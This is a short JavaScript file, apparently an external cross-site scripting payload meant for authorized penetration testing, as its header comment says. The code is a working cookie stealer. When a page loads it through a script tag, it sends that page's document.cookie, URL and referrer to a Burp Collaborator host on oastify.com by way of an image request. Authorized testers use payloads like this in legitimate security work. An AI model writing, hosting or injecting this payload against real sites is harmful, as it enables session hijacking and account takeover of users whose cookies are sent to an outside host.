/* Authorized security testing only.
   External XSS payload: runs in the ORIGIN of whatever page loads it via <script src> —
   that is the point of hosting it. Beacons document.cookie of THAT origin to the
   Burp Collaborator below. Use only against targets you have written permission to test. */
(function () {
  var C = "gh146rvcufboblinq5a7bu78lzrtfr3g.oastify.com";   // your Collaborator
  try {
    new Image().src = "//" + C + "/cookie?c=" + encodeURIComponent(document.cookie) +
                      "&u=" + encodeURIComponent(location.href) +
                      "&r=" + encodeURIComponent(document.referrer);
  } catch (e) {}
})();
